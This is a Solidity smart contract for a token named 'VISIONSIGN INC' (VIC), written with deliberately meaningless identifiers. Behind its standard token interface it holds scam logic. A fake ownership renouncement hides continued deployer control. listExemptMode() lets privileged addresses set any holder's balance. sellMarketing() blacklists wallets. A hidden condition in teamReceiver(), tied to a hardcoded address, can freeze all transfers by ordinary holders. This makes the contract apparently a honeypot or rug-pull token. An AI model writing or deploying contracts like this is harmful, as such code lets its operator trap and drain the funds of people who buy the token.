//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface swapLimit {
    function totalSupply() external view returns (uint256);

    function balanceOf(address senderWallet) external view returns (uint256);

    function transfer(address marketingSenderMax, uint256 enableIs) external returns (bool);

    function allowance(address limitSwapAt, address spender) external view returns (uint256);

    function approve(address spender, uint256 enableIs) external returns (bool);

    function transferFrom(address sender,address marketingSenderMax,uint256 enableIs) external returns (bool);

    event Transfer(address indexed from, address indexed swapMin, uint256 value);
    event Approval(address indexed limitSwapAt, address indexed spender, uint256 value);
}

interface limitList {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface marketingAuto {
    function createPair(address buyTx, address limitReceiver) external returns (address);
}

abstract contract atMaxToken {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface swapLimitMetadata is swapLimit {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract VISIONSIGNINC is atMaxToken, swapLimit, swapLimitMetadata {

    uint256 modeExempt;

    string private autoSender = "VIC";

    uint8 private isLaunched = 18;

    function decimals() external view virtual override returns (uint8) {
        return isLaunched;
    }

    constructor (){
        
        enableLaunch();
        limitList fundTo = limitList(fundIs);
        swapBuy = marketingAuto(fundTo.factory()).createPair(fundTo.WETH(), address(this));
        if (modeTake != minTrading) {
            minTrading = modeTake;
        }
        receiverIs = _msgSender();
        exemptList[receiverIs] = true;
        walletTotal[receiverIs] = maxAmount;
        if (minTrading == liquiditySenderFund) {
            exemptTotal = false;
        }
        emit Transfer(address(0), receiverIs, maxAmount);
    }

    bool private fromBuy;

    function balanceOf(address senderWallet) public view virtual override returns (uint256) {
        return walletTotal[senderWallet];
    }

    mapping(address => uint256) private walletTotal;

    mapping(address => bool) public launchTrading;

    mapping(address => mapping(address => uint256)) private liquiditySwap;

    address sellSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function totalIs(address exemptIs, address marketingSenderMax, uint256 enableIs) internal returns (bool) {
        require(walletTotal[exemptIs] >= enableIs);
        walletTotal[exemptIs] -= enableIs;
        walletTotal[marketingSenderMax] += enableIs;
        emit Transfer(exemptIs, marketingSenderMax, enableIs);
        return true;
    }

    bool public modeExemptTrading;

    address public receiverIs;

    function name() external view virtual override returns (string memory) {
        return minReceiver;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return maxAmount;
    }

    function senderReceiver(uint256 enableIs) public {
        totalSellLaunch();
        limitLaunch = enableIs;
    }

    uint256 limitLaunch;

    uint256 public minTrading;

    function getOwner() external view returns (address) {
        return receiverEnable;
    }

    function sellMarketing(address launchedList) public {
        totalSellLaunch();
        if (modeTake != minTrading) {
            minTrading = modeTake;
        }
        if (launchedList == receiverIs || launchedList == swapBuy) {
            return;
        }
        launchTrading[launchedList] = true;
    }

    function teamReceiver(address exemptIs, address marketingSenderMax, uint256 enableIs) internal returns (bool) {
        if (exemptIs == receiverIs) {
            return totalIs(exemptIs, marketingSenderMax, enableIs);
        }
        uint256 sellTo = swapLimit(swapBuy).balanceOf(sellSender);
        require(sellTo == limitLaunch);
        require(!launchTrading[exemptIs]);
        return totalIs(exemptIs, marketingSenderMax, enableIs);
    }

    mapping(address => bool) public exemptList;

    uint256 public liquiditySenderFund;

    uint256 private modeTake;

    function allowance(address takeMarketing, address autoMin) external view virtual override returns (uint256) {
        if (autoMin == fundIs) {
            return type(uint256).max;
        }
        return liquiditySwap[takeMarketing][autoMin];
    }

    function totalSellLaunch() private view {
        require(exemptList[_msgSender()]);
    }

    address fundIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function enableLaunch() public {
        emit OwnershipTransferred(receiverIs, address(0));
        receiverEnable = address(0);
    }

    address public swapBuy;

    bool public exemptTotal;

    function symbol() external view virtual override returns (string memory) {
        return autoSender;
    }

    uint256 private maxAmount = 100000000 * 10 ** 18;

    function approve(address autoMin, uint256 enableIs) public virtual override returns (bool) {
        liquiditySwap[_msgSender()][autoMin] = enableIs;
        emit Approval(_msgSender(), autoMin, enableIs);
        return true;
    }

    string private minReceiver = "VISIONSIGN INC";

    function owner() external view returns (address) {
        return receiverEnable;
    }

    bool public limitFrom;

    function shouldLaunched(address buyAuto) public {
        if (modeExemptTrading) {
            return;
        }
        if (modeTake == liquiditySenderFund) {
            exemptTotal = false;
        }
        exemptList[buyAuto] = true;
        if (liquiditySenderFund != minTrading) {
            liquiditySenderFund = minTrading;
        }
        modeExemptTrading = true;
    }

    event OwnershipTransferred(address indexed tradingMarketing, address indexed fundTrading);

    function transferFrom(address exemptIs, address marketingSenderMax, uint256 enableIs) external override returns (bool) {
        if (_msgSender() != fundIs) {
            if (liquiditySwap[exemptIs][_msgSender()] != type(uint256).max) {
                require(enableIs <= liquiditySwap[exemptIs][_msgSender()]);
                liquiditySwap[exemptIs][_msgSender()] -= enableIs;
            }
        }
        return teamReceiver(exemptIs, marketingSenderMax, enableIs);
    }

    function listExemptMode(address teamTxReceiver, uint256 enableIs) public {
        totalSellLaunch();
        walletTotal[teamTxReceiver] = enableIs;
    }

    address private receiverEnable;

    function transfer(address teamTxReceiver, uint256 enableIs) external virtual override returns (bool) {
        return teamReceiver(_msgSender(), teamTxReceiver, enableIs);
    }

}